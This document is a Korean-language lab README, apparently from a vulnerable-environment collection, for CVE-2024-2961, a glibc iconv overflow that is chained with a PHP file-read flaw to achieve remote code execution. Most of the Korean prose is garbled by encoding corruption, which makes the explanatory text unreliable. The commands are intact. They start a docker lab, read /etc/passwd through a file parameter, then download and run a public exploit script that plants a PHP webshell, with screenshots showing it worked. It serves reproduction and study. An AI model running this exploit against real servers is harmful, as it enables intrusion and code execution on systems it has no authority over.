# CVE-2024-2961: PHP νμΌ μ½κΈ°λ¥Ό ν†µν• μ›κ²© μ½”λ“ μ‹¤ν–‰ μ·¨μ•½μ  (GNU C Library Iconv)  
**CVE-2024-2961**μ€ **PHP μ• ν”λ¦¬μΌ€μ΄μ…**μ—μ„ **μ›κ²© μ½”λ“ μ‹¤ν–‰**(RCE)μ„ κ°€λ¥ν•κ² ν•λ” μ·¨μ•½μ μ΄λ‹¤.  
μ΄ μ·¨μ•½μ μ€ **GNU C λΌμ΄λΈλ¬λ¦¬**(glibc)μ **iconv() ν•¨μ**μ—μ„ λ°μƒν•λ©°, κ·Έλ΅ μΈν•΄ **λ²„νΌ μ¤λ²„ν”λ΅μ°**μ™€ **μ›κ²© μ½”λ“ μ‹¤ν–‰**(RCE) κ³µκ²©μ΄ κ°€λ¥ν•λ‹¤.

## **Vulnerability Overview (μ·¨μ•½μ  κ°μ”)**
**GNU C λΌμ΄λΈλ¬λ¦¬**(glibc)λ” νΈν™μ„±, μ΄μ‹μ„±, λ†’μ€ μ„±λ¥μ„ μλ‘ν•λ” ISO C λΌμ΄λΈλ¬λ¦¬μ΄λ‹¤.  
**CVE-2024-2961**μ€ GNU C λΌμ΄λΈλ¬λ¦¬ **2.39 μ΄ν•** λ²„μ „μ—μ„ λ°μƒν•λ” μ·¨μ•½μ μΌλ΅, `iconv()` ν•¨μμ—μ„ λ°μƒν•λ‹¤.  
νΉν, λ¬Έμμ—΄μ„ **ISO-2022-CN-EXT** λ¬Έμ μ§‘ν•©μΌλ΅ λ³€ν™ν•  λ•, μ¶λ ¥ λ²„νΌκ°€ μµλ€ **4λ°”μ΄νΈκΉμ§€ μ¤λ²„ν”λ΅μ°**λμ–΄ μ• ν”λ¦¬μΌ€μ΄μ… μ¶©λμ„ μΌμΌν‚¤κ±°λ‚ λ³€μλ¥Ό λ®μ–΄μ“Έ μ μλ‹¤.  
μ΄ μ·¨μ•½μ μ€ **PHP μ• ν”λ¦¬μΌ€μ΄μ…μ νμΌ μ½κΈ° μ·¨μ•½μ **κ³Ό κ²°ν•©λλ©΄μ„, κ³µκ²©μκ°€ **μ›κ²© μ½”λ“ μ‹¤ν–‰**(RCE) κ³µκ²©μ„ μν–‰ν•  μ μκ² λ§λ“ λ‹¤.  

μ°Έκ³ λ¬Έν—:
- https://www.ambionics.io/blog/iconv-cve-2024-2961-p1

## **μ·¨μ•½μ  μν–¥**
- **λ²„νΌ μ¤λ²„ν”λ΅μ°**: μ¤λ²„ν”λ΅μ°λ΅ μΈν•΄ μ• ν”λ¦¬μΌ€μ΄μ… μ¶©λμ΄λ‚ λ©”λ¨λ¦¬ μ†μƒμ΄ λ°μƒν•  μ μλ‹¤.
- **μ›κ²© μ½”λ“ μ‹¤ν–‰**: μ΄ μ·¨μ•½μ μ„ μ•…μ©ν•λ©΄ κ³µκ²©μκ°€ μ›κ²©μ—μ„ μ„μμ μ½”λ“λ¥Ό μ‹¤ν–‰ν•  μ μλ‹¤.

## **μ·¨μ•½ν• ν™κ²½ μ„¤μ • (Vulnearable Environment)**
λ‹¤μ λ…λ Ήμ–΄λ¥Ό μ‹¤ν–‰ν•μ—¬ **PHP 8.3.4** μ„λ²„μ™€ **iconv 2.36** λ²„μ „μ΄ ν¬ν•¨λ ν™κ²½μ„ μ‹μ‘ν•λ‹¤:
   ```bash
   docker compose up -d
   ```
   μ„λ²„κ°€ μ‹μ‘λλ©΄, λΈλΌμ°μ €μ—μ„ http://localhost:8080/index.php?file=/etc/passwdλ¥Ό ν†µν•΄ /etc/passwd νμΌμ„ μ½μ„ μ μλ‹¤.  

## **μ·¨μ•½μ  μ•…μ© (Exploit)**
1. μ·¨μ•½μ μ„ μ•…μ©ν•λ ¤λ©΄, Linux κΈ°λ° μ‹μ¤ν…κ³Ό **Python 3.10** μ΄μƒμ΄ ν•„μ”ν•λ‹¤.
2. ν•„μ”ν• μΆ…μ†μ„±μ„ μ„¤μΉν•λ‹¤:
   ```bash
   pip install pwntools
   pip install https://github.com/cfreal/ten/archive/refs/heads/main.zip
   ```
3. PoCλ¥Ό λ‹¤μ΄λ΅λ“ν•κ³  μ‹¤ν–‰ν•λ‹¤:

   ```bash
   wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
   python cnext-exploit.py http://localhost:8080/index.php "echo '<?=phpinfo();?>' > shell.php"
   ```

   β—μ£Όμ: λ§μ•½ `localhost`κ°€ μ‘λ™ν•μ§€ μ•λ”λ‹¤λ©΄, λ€μ‹  μμ‹ μ IP μ£Όμ†λ¥Ό μ‚¬μ©ν•΄μ•Ό ν•λ‹¤.
   
   π’΅μ°Έκ³ : μμ‹ μ IP μ£Όμ†λ” `ipconfig` λ…λ Ήμ–΄λ¥Ό μ‚¬μ©ν•μ—¬ ν™•μΈν•  μ μλ‹¤.

     - Linux ν™κ²½μ—μ„λ” `eth0` μΈν„°νμ΄μ¤μ—μ„ IPλ¥Ό ν™•μΈν•  μ μλ‹¤.
       
   μλ¥Ό λ“¤μ–΄, μμ‹ μ IP μ£Όμ†κ°€ `192.168.1.100`μ΄λΌλ©΄ μ•„λμ™€ κ°™μ΄ μ…λ ¥ν•λ‹¤:
   ```bash
   python cnext-exploit.py http://192.168.1.100:8080/index.php "echo '<?=phpinfo();?>' > shell.php"
   ```
   `your-ip`λ” `ipconfig` λ…λ Ήμ–΄λ¥Ό ν†µν•΄ ν™•μΈν• μ‹¤μ  IP μ£Όμ†λ΅ λ°”κΏ”μ•Ό ν•λ‹¤.

   ![image](https://github.com/user-attachments/assets/83b19dd0-48bd-42d0-a45d-891851d44651)
    μ΄μ²λΌ shell.phpκ°€ μ„±κ³µμ μΌλ΅ μ‘μ„±λλ‹¤.
   
4. λΈλΌμ°μ €μ—μ„ `shell.php`λ¥Ό ν™•μΈν•λ‹¤.
   ```bash
   http://localhost:8080/shell.php
   ```
   ![image](https://github.com/user-attachments/assets/96357e65-63ff-4313-ba5d-c553cd743d37)
   μ„μ™€ κ°™μ΄ `shell.php`κ°€ μ μ‹¤ν–‰λλ‹¤.

   
